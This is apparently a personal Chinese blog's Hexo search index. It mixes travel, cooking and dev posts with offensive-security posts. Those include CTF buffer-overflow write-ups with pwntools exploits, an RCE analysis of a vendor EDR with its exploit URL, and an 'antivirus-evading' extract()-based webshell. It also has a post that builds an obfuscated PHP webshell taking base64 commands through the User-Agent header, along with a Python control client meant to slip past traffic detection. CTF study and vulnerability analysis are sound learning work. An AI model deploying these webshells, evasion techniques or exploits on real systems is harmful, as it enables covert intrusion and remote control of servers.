<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pwn之pwn1</title>
    <link href="/2020/10/21/pwn%E4%B9%8Bpwn1/"/>
    <url>/2020/10/21/pwn%E4%B9%8Bpwn1/</url>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>BUUCTF <a href="https://buuoj.cn/challenges">地址</a></p><h3 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>F5 查看伪代码，gets存在溢出漏洞，并且存在system函数。所以只需要计算出偏移量，溢出跳转至system函数。<br><img src="/images/pwn1/1.png"> </p><p>system函数地址<code>0x000000000040118A</code>。<br><img src="/images/pwn1/3.png"> </p><h3 id="手动偏移量计算"><a href="#手动偏移量计算" class="headerlink" title="手动偏移量计算"></a>手动偏移量计算</h3><p>ida逆向寻找到gets的地址，并在gdb中下断点。<br><img src="/images/pwn1/2.png"> </p><p>输入<code>r</code>运行，计算ESP 到 EBP的偏移量<code>0x7fffffffdde0-(0x7fffffffdde0+1h)+8=23</code>，因为一个指针在64位操作系统上，占8个字节，所以要加8。详细计算方式可参考<a href="https://www.mi1k7ea.com/2019/03/03/ROP%E4%B9%8Bret2text/">如下链接</a></p><p><img src="/images/pwn1/4.png"> </p><p>输入<code>c</code>继续运行，EAX与ESP的偏移量确实为<code>1h</code>，而ida静态分析中发现ESP到EAX的偏移量<code>1h</code>是正确的，ESP到EBP为<code>F (15)</code>错误的</p><p><img src="/images/pwn1/5.png"> </p><h3 id="GDB-pattern计算偏移量"><a href="#GDB-pattern计算偏移量" class="headerlink" title="GDB pattern计算偏移量"></a>GDB pattern计算偏移量</h3><pre><figcaption><span>50```随机生成50个字符，输入运行。根据报错地址内容```0x3b41414441412841```计算偏移量。</span></figcaption><code class="hljs pattern_create">![](&#x2F;images&#x2F;pwn1&#x2F;6.png) &#96;&#96;&#96;pattern_offest 0x3b41414441412841&#96;&#96;&#96;计算出偏移量为23。![](&#x2F;images&#x2F;pwn1&#x2F;7.png) ### poc* 本地poc&#96;&#96;&#96;aidlfrom pwn import *sh &#x3D; process(&quot;.&#x2F;pwn1&quot;)binsh_addr &#x3D; 0x000000000040118Apayload &#x3D; &#39;&#39;payload +&#x3D; &#39;A&#39;*23payload +&#x3D; p64(binsh_addr)sh.sendline(payload)sh.interactive()</code></pre><ul><li>远程poc<br>&lt;!–hexoPostRenderEscape:<pre><code class="hljs aidl">from pwn import *</li></ul><p>sh &#x3D; remote(&#39;node3.buuoj.cn&#39;,26142)<br>binsh_addr &#x3D; 0x000000000040118A<br>payload &#x3D; &#39;&#39;<br>payload +&#x3D; &#39;A&#39;*23<br>payload +&#x3D; p64(binsh_addr)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre>:hexoPostRenderEscape–&gt;</p>]]></content>
    
    
    
    <tags>
      
      <tag>二进制安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>北戴河之旅</title>
    <link href="/2020/10/09/%E5%8C%97%E6%88%B4%E6%B2%B3%E4%B9%8B%E6%97%85/"/>
    <url>/2020/10/09/%E5%8C%97%E6%88%B4%E6%B2%B3%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>今天年的国庆节并未想好去哪？上海、三亚、威海。。。。很多地方在我脑中闪过，因为从小在内陆长大一直对大海有一直莫名的向往。但国庆又是一个很特别的期间，游客之多难以想象。再一次朋友的推荐下，我选择了北戴河。</p><h3 id="行程规划"><a href="#行程规划" class="headerlink" title="行程规划"></a>行程规划</h3><p>出发地:<code>北京站</code><br>目的地:<code>北戴河站</code><br>时间:<code>2小时</code></p><h3 id="酒店住宿"><a href="#酒店住宿" class="headerlink" title="酒店住宿"></a>酒店住宿</h3><p>地点:<code>南戴河金海岸</code><br>价格:<code>350左右/天</code></p><h3 id="鸽子窝公园"><a href="#鸽子窝公园" class="headerlink" title="鸽子窝公园"></a>鸽子窝公园</h3><p>网上说，鸽子屋的日出是很美的。但我早上并没有起来，就在酒店看了看日出，海上的日出确实让我眼前一亮，很美。收拾完后，到了鸽子屋大概10点左右，相对其他地方的景点来说，人数应该算是一吧。门票价25元一位，价格很亲民。我和女朋友一起去的，沙滩上一边走一边看海鸽子，偶而不远的地方还有一片小礁石，很多大人带着小孩在那里抓螃蟹、皮皮虾、贝壳。</p><h3 id="刘庄夜市"><a href="#刘庄夜市" class="headerlink" title="刘庄夜市"></a>刘庄夜市</h3><p>刘庄夜市距离鸽子屋坐公交车只有2站的距离，不是很远。这里主要是个小吃的地方，东西的感觉较贵一些，味道整体给4颗星吧，还行。不过这里的建筑分格很有特色，繁华中不失唯美。</p><h3 id="碧螺岛"><a href="#碧螺岛" class="headerlink" title="碧螺岛"></a>碧螺岛</h3><p>碧螺岛位于黄金海岸对面，距离酒店很近。但需要乘坐缆车过去，票价是95，还包括一个海上游船票，我个人觉的游船不太好玩。但是缆车还是相当不错的，坐在缆车上，在高空眺望大海。。。。。</p><h3 id="南戴河金海岸"><a href="#南戴河金海岸" class="headerlink" title="南戴河金海岸"></a>南戴河金海岸</h3><p>大概下午5点中左右，延着黄金海岸一直往南走去，不远处你会发现一个渔民出海归来的地方。此时正是渔民打鱼归来，夕阳照射下的渔船是那么的唯美，接着一框一筐的海鲜被搬上岸来，有螃蟹、海星、拳头大的海螺等等。。。。由于我正好10月份去，刚好赶上梭子蟹正肥的时候。从渔民手里购买会比市场便宜很多而且又新鲜，如果你砍价的能力强的话，200多可以买很多东西。</p>]]></content>
    
    
    
    <tags>
      
      <tag>旅行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单的Telegram机器人</title>
    <link href="/2020/09/20/%E7%AE%80%E5%8D%95%E7%9A%84Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    <url>/2020/09/20/%E7%AE%80%E5%8D%95%E7%9A%84Telegram%E6%9C%BA%E5%99%A8%E4%BA%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="Telegram"><a href="#Telegram" class="headerlink" title="Telegram"></a>Telegram</h2><p>闲来无事！！！！，做了一个简单的Telegram BOT!<br>闲来无事! ! ! !，做了一个简单的Telegram BOT，该机器人目前支持一些简单的加解密功能，还有数字货币买入卖出点的简单计算功能!<br>机器人订阅ID<br>@yll1122_bot</p><h3 id="常规无杠杆计算"><a href="#常规无杠杆计算" class="headerlink" title="常规无杠杆计算"></a>常规无杠杆计算</h3><p>输入: 盈利<code>s</code> 输入的买入币价<code>x</code> 买入总金额<code>base</code> </p><p>首先先计算出买入的数量:<br><code>number = base / x</code><br>这样再去计算预计卖出币价y1:<br>预计获利 = (预计卖出币价y1 * 买入数量number) - (当前买入币价x * 买入数量number) - (预计卖出总价<code>买入卖出两次交易手续费</code>*交易手续费率)<br><code>s = y1 * number - x * number - (y1+x) * number *0.002(方程)</code><br>预计卖出价(赚s利润):<code>y1 = (s + 1.002 * x * number) / (0.998  * number)</code><br>涨跌百分比:<code>n = (y1-x) / x</code><br>预计卖出价(赔s利润):<code>y2 = (-s + 1.002 * x * number) / (0.998  * number)</code><br><img src="/images/telegram/2.png">  </p><h3 id="逐仓杠杆计算-做空"><a href="#逐仓杠杆计算-做空" class="headerlink" title="逐仓杠杆计算(做空)"></a>逐仓杠杆计算(做空)</h3><p>在杠杆中存在几个关键的数字，以做空为例，爆仓触发风险率R=110％。当前买入价x，预计卖出币价y1，爆仓价p，天数day，杠杆倍数n，本金定为base，借币数量number，pi。<br>输入: 盈利<code>s</code> 倍数<code>bei</code> 当前卖出价格<code>x</code> 本金<code>base</code> 天数<code>day</code><br>借币数量: <code>number = (base/x) * bei</code><br>预计获利 = (当前卖出币价x * 借入数量number) - (预计当前买入币价y1 * 借入数量number) - (预计卖出总价<code>买入卖出两次交易手续费</code><em>交易手续费) - (当前买入币价x * 借入数量number * 利率 * 天数)<br>方程 <code>s = (x * number) - (y1 * number) - ((x + y1) * number * 0.002) - (y1 * number * 0.00098 * day)</code><br>预计卖出价(赚s利润): <code>y1 = ((0.998 * number * x) - s) / ((1.002 + (0.00098*day) ) * number * day)</code><br>涨跌百分比: <code>n = (y1-x) / x</code><br>预计卖出价(赔s利润): <code>y2 = ((0.998 * number * x) + s) / ((1.002 + (0.00098*day) ) * number * day)</code><br>风险率计算公式: (担保资产+当前借币金额)/(未来借币金额+未还币息)*100%<br>1.1 = (本金a + 借贷数量t</em>当前卖币价x)/(借贷数量t<em>预计买入价y1+借贷数量t</em>预计买入y1*0.00098) * 100%<br>方程 <code>1.1 = (base + (x * number)) / (y1 * number + (y1 * number *0.00098 * day)) * 100%</code><br><code>y1 * number + (y1 * number *0.00098 * day) = ((base + (x * number)) / 1.1) / (number * (1 + (0.00098 * day))</code><br>爆仓价: <code>y1 = p =  ((base + (x * number)) / 1.1) / (number * (1 + 0.00098 + day))</code><br>风险率: <code>k = (base + (p1 * number)) / (x * number + (x * number * 0.00098 * day))</code><br><img src="/images/telegram/2.png">  </p><h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p>使用的框架:<a href="https://github.com/python-telegram-bot/python-telegram-bot">https://github.com/python-telegram-bot/python-telegram-bot</a> <code>机器人python开发框架</code></p><p>本地项目地址:<a href="https://github.com/YLL-F1/telegram_bot">https://github.com/YLL-F1/telegram_bot</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn之ret2text</title>
    <link href="/2020/09/10/pwn%E4%B9%8Bret2text/"/>
    <url>/2020/09/10/pwn%E4%B9%8Bret2text/</url>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>题目下载<a href="https://github.com/YLL-F1/pwn/raw/master/ret2text">下载地址</a></p><h3 id="web狗的转型之路"><a href="#web狗的转型之路" class="headerlink" title="web狗的转型之路"></a>web狗的转型之路</h3><p>before long history。。。。。。之前，一直在web层的安全进行专研，偶然一次接触pwn题，感觉在安全路上又找到了一个新的起点。接下来也会慢慢步入pwn中，了解二进制中的安全。</p><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><ul><li><font color=red>gdb:</font> linux下的动态调试工具。  </li><li><font color=red>ida:</font> 方便windows下静态查看的反编译工具。  </li></ul><h3 id="题目大概"><a href="#题目大概" class="headerlink" title="题目大概"></a>题目大概</h3><p><img src="/images/ret2text/6.png"><br>初步运行该文件，发现该文件功能大致为输入，输出。<br><img src="/images/ret2text/1.png"><br>IDA还原C代码，可以发现主函数使用gets()进行输入，printf()进行输出。 </p><h3 id="概要分析"><a href="#概要分析" class="headerlink" title="概要分析"></a>概要分析</h3><p><img src="/images/ret2text/2.png"> </p><p><img src="/images/ret2text/5.png"><br>IDA分析发现的看到两个关键点分别为gets()，system()。正常运行题目文件会在输入参数后跳转到printf()函数，是无法跳转到system函数。所以，我们要利用C语言中的gets()函数存在溢出漏洞进行填充溢出至system()函数地址```0x0804863A``，去执行system()函数。</p><h3 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h3><p>ida静态分析，定位到gets()函数地址。F5还原C代码，ida显示s到ebp的偏移为64h，但ida的静态分析可能存在不准确信，所有再用gdb动态进行分析确定。<br>使用GDB在gets()函数地址080486AE下断点 <code>b *0x080486AE</code><br>输入<code>r</code>运行<br><img src="/images/ret2text/3.png"><br>ESP为ffffcfa0，其中存放的内容为ffffcfbc，即输入的内容s的地址为ESP+1c= ffffcfbc，而EBP为ffffd028，则s到EBP的偏移为|ffffd028- ffffcfbc|=6c，所以s相对与返回地址的偏移为0x6c+4=0x70。所以ida的偏移64h还是存在偏差。所以溢出偏移量为0x6C+0x04(return地址)=0x70。</p><h3 id="GDB-pattern计算偏移量"><a href="#GDB-pattern计算偏移量" class="headerlink" title="GDB pattern计算偏移量"></a>GDB pattern计算偏移量</h3><p><img src="/images/ret2text/7.png"><br>在get()函数的下一个地址下断点，进入输入参数阶段。<br><img src="/images/ret2text/9.png"><br>使用<code>pattern_create 200</code>生成随机200个字符，来进行溢出输入。<br><img src="/images/ret2text/10.png">  </p><p><img src="/images/ret2text/11.png"><br>使用GDB pattern通过溢出的地址计算出偏移量为112=0x70。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="hljs aidl">from pwn import *sh &#x3D; process(&quot;.&#x2F;ret2text&quot;)binsh_addr &#x3D; 0x0804863apayload &#x3D; flat([&quot;A&quot; * 0x70, binsh_addr])sh.sendline(payload)sh.interactive()</code></pre><p>编写POC，成功调用system函数。<br><img src="/images/ret2text/12.png">  </p>]]></content>
    
    
    
    <tags>
      
      <tag>二进制安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某X服EDR审计</title>
    <link href="/2020/08/31/%E6%9F%90X%E6%9C%8D%E5%AE%A1%E8%AE%A1/"/>
    <url>/2020/08/31/%E6%9F%90X%E6%9C%8D%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>最近hw的举行区间，某服爆出一起神奇的漏洞。那咱就对他的代码分析分析是怎么产生的这个漏洞点。 </p><ul><li>据网上公开的paylaod显示，该漏洞利用方式难度较低。</li></ul><p><code>https://x.x.x.x/tool/log/c.php?strip_slashes=system&amp;host=id</code>  </p><p><img src="/images/edr/1.png">  </p><h2 id="原代码分析"><a href="#原代码分析" class="headerlink" title="原代码分析"></a>原代码分析</h2><h3 id="php变量覆盖"><a href="#php变量覆盖" class="headerlink" title="php变量覆盖"></a>php变量覆盖</h3><p>应为这个漏洞点源自于php中的变量覆盖，也就是自定义的参数值替换原有变量值的情况，也称为变量覆盖漏洞。</p><pre><code class="hljs aidl">&lt;?php$a &#x3D; 1;    &#x2F;&#x2F;原变量值为1extract(array(&#39;a&#39; &#x3D;&gt; &#39;3&#39;));&#x2F;&#x2F;经过extract()函数对$b处理后echo $a;    &#x2F;&#x2F;输出结果为3?&gt;</code></pre><h3 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h3><p>根据payload分析，该漏洞点定存在于c.php代码中，首先先看下show_form函数。不难发现show_form的所接受的参数$params可以被extract函数进行变量覆盖。</p><p><img src="/images/edr/2.png">  </p><h3 id="可变量输入"><a href="#可变量输入" class="headerlink" title="可变量输入"></a>可变量输入</h3><p>那既然extract可以进行变量覆盖，所以就要寻找show_form($params)所接受的参数是否为可变量，或如何构造可变量。接着往下走$show_form($_REQUEST)这段函数让$params成为可能。<br><img src="/images/edr/3.png">  </p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>既然已经有了可控变量，那如何构造出所需的payload？$strip_slashes($host)该函数其实已经帮我们完成了构造，直接用即可。在传入所需参数后该函数就变为system(id)，所以只需变host即可。<br><img src="/images/edr/4.png">  </p><h2 id="免杀webshell"><a href="#免杀webshell" class="headerlink" title="免杀webshell"></a>免杀webshell</h2><p>既然知道了原理，就顺手写一个webshell看看其是否拥有免杀功能。哈哈哈。</p><pre><code class="aidl">&lt;?php    function kk($params)&#123;    extract($params);    $qq($jj);&#125;;kk($_REQUEST);?&gt;</code></pre><p><img src="/images/edr/5.png"><br>D盾测试，效果还可以。<br><img src="/images/edr/6.png"> </p>]]></content>
    
    
    
    <tags>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>土豆牛腩</title>
    <link href="/2020/08/11/%E5%9C%9F%E8%B1%86%E7%89%9B%E8%85%A9/"/>
    <url>/2020/08/11/%E5%9C%9F%E8%B1%86%E7%89%9B%E8%85%A9/</url>
    
    <content type="html"><![CDATA[<p>闲来无事，做一波美食。<br><img src="/images/Potato_beef_brisket/goulash.JPG">  </p><p><img src="/images/Potato_beef_brisket/potato.JPG">  </p><p><img src="/images/Potato_beef_brisket/potato_beef_brisket_2.JPG">  </p>]]></content>
    
    
    
    <tags>
      
      <tag>美食</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>流量混淆webshell</title>
    <link href="/2020/08/06/%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86webshell/"/>
    <url>/2020/08/06/%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86webshell/</url>
    
    <content type="html"><![CDATA[<h2 id="webshell是什么？"><a href="#webshell是什么？" class="headerlink" title="webshell是什么？"></a>webshell是什么？</h2><p>刚刚接触安全的时候，对于webshell这个概念还是十分的惊奇。只记得当时带课的老师才测试网站上传了一个php文件（老师说是webshell），然后用了一个软件就直接可以控制测试网站了。当时觉的真TM的牛皮，那时起觉的安全还挺有意思的。  </p><h3 id="回忆复现"><a href="#回忆复现" class="headerlink" title="回忆复现"></a>回忆复现</h3><p><font size=1 color=Blue><em>到底websehll是什么？那就来回忆下当前的情景。</em></font><br>工具: phpstudy、菜刀、一句话webshell<code>&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;</code>。<br>操作流程:    </p><ul><li>将webshell保存为后缀为.php的文件并上传到相应的web目录下。  </li></ul><p><img src="/images/2020-8-6/yijuhua.png"></p><ul><li>使用中国菜刀进行连接  </li></ul><blockquote><p>中国菜刀 是一款由中国大牛开发的webshell后门管理工具。配置简便、功能强大、使用方便，可以说是一款强大好用的“web管理工具”。   </p></blockquote><p><img src="/images/2020-8-6/caidao_config.png"></p><p><img src="/images/2020-8-6/caidao.png"></p><h3 id="菜刀分析"><a href="#菜刀分析" class="headerlink" title="菜刀分析"></a>菜刀分析</h3><ul><li>在菜刀客户端中输入ipconfig命令，然后通过winshark抓包分析菜刀运行的原理。  </li></ul><p><img src="/images/2020-8-6/ipconfig.png">  </p><p><img src="/images/2020-8-6/caidao_pcap.png">  </p><ul><li>菜刀将执行的命令通过base64加密传入webshell中，对psot字段进行base64解密看看其详情信息<a href="https://blog.csdn.net/gscaiyucheng/article/details/24911375">(菜刀分析参加文章)</a>。  </li></ul><p><img src="/images/2020-8-6/base64.png">  </p><ol><li><p>@ini_set(“display_errors”,”0”);临时关闭PHP的错误显示功能</p></li><li><p>@set_time_limit(0);防止像dir、上传文件大马时超时</p></li><li><p>@set_magic_quotes_runtime(0);关闭魔术引号，这东西在4.0以后就不怎么用了</p></li><li><p>$p=’cmd’;执行cmd</p></li><li><p>$s=’cd /d D:\&amp;ipconfig&echo;执行ipconfg并输出</p></li></ol><h3 id="一句话分析"><a href="#一句话分析" class="headerlink" title="一句话分析"></a>一句话分析</h3><p><code>&lt;?php eval(@$_POST[&#39;a&#39;]); ?&gt;</code><br>为什么如此简单的一句话就可以拥有如此神奇的力量，让他足以控制一台计算机。其实是计算机语言的魅力，每一种计算机语言都是为操作计算机系统而生。当然webshell也是计算机语言所写，其又被称为服务器控制端，那如过被攻击者利用就被称之为shell了。  </p><ul><li><p>以php语言为案例，攻击者通过各种函数、变量拼接，从而构造出命令执行函数，php 常见命令执行函数: </p><pre><code class="hljs aidl">$&#123;&#125;Eval()Assert()preg_replace()create_function()array_map()call_user_func()&#x2F;call_user_func_array()array_filter()usort(),uasort()</code></pre></li><li><p>通过post传入payload执行命令并回显<br><img src="/images/2020-8-6/post.png">  </p></li><li><p>winshark抓包<br><img src="/images/2020-8-6/post_pcap.png">  </p></li></ul><p>相信看到这一步应该对webshell有一个大概的了解，简单理解了webshell的执行原理。</p><h2 id="流量加密"><a href="#流量加密" class="headerlink" title="流量加密"></a>流量加密</h2><p>目前市场上的安全设备对于恶意数据流都可精准检测其特征，而常规的一句话木马、菜刀等特征过于明显。而且大部分的黑客工具都被列入特征库，所以攻击方的攻击手法很容易被针对，攻击链路也很容易被还原。</p><h3 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h3><p>常规的webshell是将所需的payload通过post进行传参，很容易被流量设备检测。当然，你也可以使用其他地方进行传参。</p><ul><li>例如：user_agent加密进行传参，然后再解密执行命令。   </li></ul><p><img src="/images/2020-8-6/post_encrypt.png">  </p><ul><li>winshark抓包  </li></ul><p><img src="/images/2020-8-6/post_encrypt_pcap.png">   </p><h3 id="webshell源码"><a href="#webshell源码" class="headerlink" title="webshell源码"></a>webshell源码</h3><pre><code class="hljs aidl">&lt;?php$dd &#x3D; $_SERVER[&#39;HTTP_USER_AGENT’];&#x2F;&#x2F;获取user_agent参数$qq &#x3D; base64_decode($dd);&#x2F;&#x2F;解密user_agent参数$jjj &#x3D; exec ($qq,$out);&#x2F;&#x2F;执行user_agent参数for ($i&#x3D;0 ;$i &lt; count($out) ;$i++)&#123;    $ls &#x3D; $ls.$out[$i].&quot;\n&quot;;&#125;echo base64_encode($ls);&#x2F;&#x2F;加密输入执行后的系统命令?&gt;</code></pre><h3 id="客户端源码"><a href="#客户端源码" class="headerlink" title="客户端源码"></a>客户端源码</h3><p>当然用浏览器手工去输入shell着实不太方便，写一个简单的控制脚本。</p><pre><code class="hljs aidl">#!&#x2F;usr&#x2F;bin&#x2F;python# -*- coding: UTF-8 -*-import requestsimport base64str_1 &#x3D; &quot;&quot;headers &#x3D; &#123;        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8&quot;,        &quot;User-Agent&quot;: &quot;adwd&quot;,        &quot;Accept&quot;:&quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2&quot;,        &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;    &#125;while True:    str_1 &#x3D; input(&quot;please input cmd:&quot;)    str_1 &#x3D; bytes(str_1, encoding&#x3D;&quot;gbk&quot;)    str_1 &#x3D; base64.b64encode(str_1)    headers[&#39;User-Agent&#39;]&#x3D;str_1    ls &#x3D; requests.get(url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;1.php&quot;,headers&#x3D;headers)#url更改位置    ls_1 &#x3D; ls.content    ls_1 &#x3D; base64.b64decode(ls_1)    ls_2 &#x3D; str (ls_1, encoding&#x3D;&quot;gbk&quot;)    print (ls_2)</code></pre><h2 id="流量混淆"><a href="#流量混淆" class="headerlink" title="流量混淆"></a>流量混淆</h2><p>上面的加密user_agent的特征还是较为明显。新思路:客户端将所需的payload通过base64加密进行拆分，嵌入正常的user_agent中，然后传入服务器。Webshell再从user_agent中提取payload解密执行，将回显命令通过base64+assic移位进行加密输出。客户端再对加密回显进行解密。 </p><h3 id="使用详情"><a href="#使用详情" class="headerlink" title="使用详情"></a>使用详情</h3><p>通过上面思路，分别编写了php与jsp的webshell，还有python客户端。当然目前并不支持文件上传，和其他高级功能，后续再持续更新。<br><a href="https://github.com/YLL-F1/--jsp-php">源码下载</a><br><img src="/images/2020-8-6/complete.png">  </p><p><img src="/images/2020-8-6/complete_pcap.png">  </p>]]></content>
    
    
    
    <tags>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo博客搭建</title>
    <link href="/2020/08/05/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    <url>/2020/08/05/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="安装流程（windows环境）"><a href="#安装流程（windows环境）" class="headerlink" title="安装流程（windows环境）"></a>安装流程（windows环境）</h2><h3 id="node-js安装"><a href="#node-js安装" class="headerlink" title="node.js安装"></a>node.js安装</h3><p>官网下载node.exe并安装<br><img src="/images/2020-8-5/node.png"></p><h3 id="安装Git-→-安装Hexo"><a href="#安装Git-→-安装Hexo" class="headerlink" title="安装Git → 安装Hexo"></a>安装Git → 安装Hexo</h3><p>官网下载git.exe并安装<a href="https://hexo.io/zh-cn/docs/index.html">(安装教程)</a><br>打开 git bash 输入以下命令</p><hr><p><code>npm install -g hexo-cli</code><br>Hexo 完成后，请特别的注意看注释。<br>hexo init <folder>  folder指我们要安装的博客根目录<br><code>hexo init blog</code> #指的是在当前文件夹下新建blog目录作为博客的根目录<br><code>cd</code><br><code>npm install</code>  安装所有的依赖包<br><code>hexo server</code></p><hr><p><img src="/images/2020-8-5/hexo-s.png"><br><img src="/images/2020-8-5/index.png"></p><h3 id="主题更换"><a href="#主题更换" class="headerlink" title="主题更换"></a>主题更换</h3><p>hexo支持自由更换主题，并且当更换主题是内容不变（适合喜新厌旧的小伙伴）。我使用的主题是hexo-theme-fluid<a href="https://fluid-dev.github.io/hexo-fluid-docs/guide/">(使用文档)</a><br>将主题拷贝到站点的themes目录下<br><code>git clone https://github.com/fluid-dev/hexo-theme-fluid.git themes/</code><br>同时修改<code>_config.yml</code>中theme字段为<code>hexo-theme-fluid</code><br><code>hexo clean</code><br><code>hexo server</code><br><img src="/images/2020-8-5/fulid.png">  </p><h2 id="Github托管"><a href="#Github托管" class="headerlink" title="Github托管"></a>Github托管</h2><h3 id="注册GitHub账号"><a href="#注册GitHub账号" class="headerlink" title="注册GitHub账号"></a>注册GitHub账号</h3><p>在Github官网注册账号，这样我们便拥有的发布的授权。github有许多的功能，发布blog也是我最近才发现的，当然我也正在尝试挖掘其他有趣的function。  </p><h3 id="创建repository"><a href="#创建repository" class="headerlink" title="创建repository"></a>创建repository</h3><p><img src="/images/2020-8-5/github.png"></p><h3 id="设置ssh连接"><a href="#设置ssh连接" class="headerlink" title="设置ssh连接"></a>设置ssh连接</h3><p>设置 SSH 远程连接设置Git的user name和email<br><code>git config --global user.name &quot;xxx&quot;</code><br><code>git config --global user.email &quot;xxx@qq.com&quot;</code><br>本地生成密钥<br><code>ssh-keygen -t rsa -C &quot;xxx@qq.com&quot;</code><br>将生成的<code>id_rsa.pub</code>内容粘贴到github上。<br><img src="/images/2020-8-5/ssh-key.png"></p><h3 id="发布到Github"><a href="#发布到Github" class="headerlink" title="发布到Github"></a>发布到Github</h3><p>在博客的配置文件中_config.yml 中 末尾添加Deploy</p><pre><code class="deploy:">  type: git  repo:    github: git@github.com:xxx/xxx.github.io.git,master</code></pre><p>在cmd中执行<code>hexo clean</code> <code>hexo g -d</code>  </p><h2 id="success"><a href="#success" class="headerlink" title="success"></a>success</h2><p>访问<a href="https://yll-f1.github.io/">https://yll-f1.github.io</a><br><img src="/images/2020-8-5/success.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第一篇属于自己的博客</title>
    <link href="/2020/08/05/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
    <url>/2020/08/05/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>  之前一直在第三方记录生活与工作所碰到的故事，但是由于种种原因，第三方所提供的服务总是出现问题。<a href="https://www.jianshu.com/u/48db49c4aa0a">之前的博客</a></p><h2 id="example"><a href="#example" class="headerlink" title="example:"></a><em>example:</em></h2><p>  服务器正在维护中，您的文章目前处于维护状态，您的的文章目前处于审核状态。。。。。  所以，我找了大量的博客搭建资料。发现github原来是一个相当不错的博客搭建平台，既不需要购买VPS，也不需要购买域名，并且又方便转移。</p><h4 id="自律"><a href="#自律" class="headerlink" title="自律"></a>自律</h4><p>当然写博客也是为了提高自己的自律性。因为好多时候总是把时间浪费在LOL、手游、抖音等等上，感觉有那么一点点荒废（哈哈）。所以说想把这些时间用在博客身上，也未必不是一件很有意义的事情。当然我要严格要求自己每周更新一篇文章，内容不限（技术、生活、运动、旅行、风景等），让生活变的更有意义。</p>]]></content>
    
    
    
    <tags>
      
      <tag>开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
